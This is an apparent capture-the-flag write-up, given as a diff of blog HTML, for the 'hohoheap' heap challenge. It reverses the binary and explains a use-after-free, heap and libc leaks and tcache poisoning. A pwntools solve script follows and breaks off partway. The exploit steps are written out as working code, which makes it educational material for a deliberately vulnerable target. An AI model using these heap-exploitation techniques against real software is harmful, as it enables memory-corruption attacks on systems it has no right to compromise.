+                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104860</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                  <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00105080</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">local_18</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Gifts given!"</span><span class="p">);</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+              <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">for</span> <span class="p">(</span><span class="n">local_3c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_3c</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="n">local_3c</span> <span class="o">=</span> <span class="n">local_3c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+              <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00105080</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_3c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Gift %d sent! Merry Christmas!</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">local_3c</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104860</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00105080</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_3c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
+                <span class="p">}</span>
+                <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00105080</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_3c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
+              <span class="n">puts</span><span class="p">(</span><span class="s">"Merry Christmas!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+              <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid command!"</span><span class="p">);</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">DAT_00105060</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Maximum number of gifts reached"</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Gift size: "</span><span class="p">);</span>
+      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_30</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">&lt;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Size too big!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">local_18</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">DAT_00105060</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">local_18</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104c60</span> <span class="o">+</span> <span class="n">DAT_00105060</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_30</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">DAT_00105060</span> <span class="o">=</span> <span class="n">DAT_00105060</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+  <span class="p">}</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>honestly during the ctf itself i just took this decompilation and whacked it into Gemini to clean it up, but now doing my writeup (and also now that i have IDA Pro) i did the static reversing manually, just by cleaning up the variable names and setting proper types.</p>
+
+<p>the crux of the challenge is in these three options:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">case</span> <span class="mi">4LL</span><span class="p">:</span>
+        <span class="c1">// free gift</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Gift index: "</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gift_idx</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">gift_idx</span> <span class="o">&gt;=</span> <span class="o">::</span><span class="n">gift_idx</span> <span class="p">)</span>
+          <span class="k">goto</span> <span class="n">invalid_idx_B</span><span class="p">;</span>
+        <span class="n">gift</span> <span class="o">=</span> <span class="n">gift_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">gift</span> <span class="o">||</span> <span class="n">secondary_gift_idx_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"Unable to remove gift"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="n">free</span><span class="p">(</span><span class="n">gift</span><span class="p">);</span>
+          <span class="n">gift_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">size_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">secondary_gift_idx_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">5LL</span><span class="p">:</span>
+        <span class="c1">// // add gift to freelist</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Gift index: "</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gift_idx</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"How many gifts to give: "</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">gift_idx</span> <span class="o">&gt;=</span> <span class="o">::</span><span class="n">gift_idx</span> <span class="p">)</span>
+          <span class="k">goto</span> <span class="n">invalid_idx_B</span><span class="p">;</span>
+        <span class="n">gift</span> <span class="o">=</span> <span class="n">gift_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">gift</span> <span class="p">)</span>
+          <span class="k">goto</span> <span class="n">invalid_idx_A</span><span class="p">;</span>
+        <span class="n">secondary_gift_idx_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="o">+=</span> <span class="n">v7</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">secondary_gift_idx_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="p">)</span>
+          <span class="n">secondary_gift_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">gift</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Gifts given!"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">6LL</span><span class="p">:</span>
+        <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>            <span class="c1">// free all gifts in freelist (UAF)</span>
+        <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">secondary_gift_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Gift %d sent! Merry Christmas!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">secondary_gift_idx_array</span><span class="p">[</span><span class="n">gift_idx</span><span class="p">]</span> <span class="p">)</span>
+              <span class="n">free</span><span class="p">(</span><span class="n">secondary_gift_array</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="n">secondary_gift_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>essentially, there are two places where a pointer to a <em>gift</em> can exist: in <code class="language-plaintext highlighter-rouge">gift_array</code>, and <code class="language-plaintext highlighter-rouge">secondary_gift_array</code>, and we are given two options to interact with those arrays. the first option correctly nulls out the pointer in <code class="language-plaintext highlighter-rouge">gift_array</code> and <code class="language-plaintext highlighter-rouge">secondary_gift_array</code>, thus leaving no dangling pointers (and no UAF). however, the second option only nulls out the pointer in <code class="language-plaintext highlighter-rouge">secondary_gift_array</code>, leaving a dangling pointer to a freed gift in the first array. this is our use-after-free, which is a significant enough vulnerability that we can pop a shell just from it.</p>
+
+<p>however, to get started, we need heap + libc leaks. to leak the heap, we can just allocate a chunk, free it, and then directly read the ptr_mangle key from it w/ our UAF. this is because when we allocate that doesn’t have a chunk following it, the fd ptr should rightfully point to null, so the stored fd will actually be null ^ ptr_mangle (which of course would just be the ptr_mangle key). we can see this in action here.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x5622387770b0</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x562238777340</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x562238777330</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x562238777340</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x000562238777</span><span class="p">(</span><span class="o">=</span><span class="mh">0x000000000000</span><span class="p">))</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">valid</span> <span class="n">chunks</span> <span class="n">in</span> <span class="n">tcache</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 0
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 1
+</span>    <span class="n">uaf_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">trigger_uaf_free</span><span class="p">()</span>
+    <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">clean_up</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span> <span class="o">=</span> <span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>this code should read our leaked key:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clean_up(heap_leak) = '0000000560f445ba'
+</code></pre></div></div>
+
+<p>and indeed, it does. then for libc we can just do the same, but with a larger chunk that goes directly into unsorted bins.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 2
+</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 3, guard
+</span><span class="n">uaf_free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">trigger_uaf_free</span><span class="p">()</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">clean_up</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">libc_leak</span> <span class="o">=</span> <span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>afterwards, we can just tcache poison and win. to demonstrate the tcache poisoning, look below:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## tcache poisoning
+</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 4
+</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 5
+</span><span class="n">uaf_free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">uaf_free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">trigger_uaf_free</span><span class="p">()</span>
+<span class="n">modify</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcacacacacacacaca</span> <span class="o">^</span> <span class="n">ptr_mangle</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>we can view tcache contents, and see that the chunk’s fd ptr is correctly poisoned:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">31</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x5577202441a0</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x557720244580</span> <span class="n">count</span><span class="o">=</span><span class="mi">2</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x557720244570</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x557720244580</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0xcacacacf9db8c88e</span><span class="p">(</span><span class="o">=</span><span class="mh">0xcacacacacacacaca</span><span class="p">),</span> <span class="n">corrupted</span><span class="p">)</span>
+ <span class="o">-&gt;</span> <span class="mh">0xcacacacacacacaca</span> <span class="p">[</span><span class="n">corrupted</span> <span class="n">chunk</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>from here, we just fsop and win by writing a chunk over stderr.</p>
+
+<p>solve script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./hohoheap_patched"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s">'kitty'</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="c1">#p = remote("52.76.163.244", 5555)
+</span><span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="n">sa</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span>
+<span class="n">ru</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span>
+
+<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="nb">filter</span> <span class="o">=</span> <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">uaf_free</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">trigger_uaf_free</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="n">clean_up</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'0000'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># begin leak nonsense
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 0
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 1
+</span>    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 2
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 3
+</span>    <span class="n">leak_1</span> <span class="o">=</span> <span class="s">'0x'</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'0000'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">leak_2</span> <span class="o">=</span> <span class="s">'0x'</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'0000'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">ptr_mangle</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_1</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak_2</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'ptr_mangle leaked &gt; '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ptr_mangle</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mi">8000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 4
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 5 (guard chunk)
+</span>    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mi">8000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 6
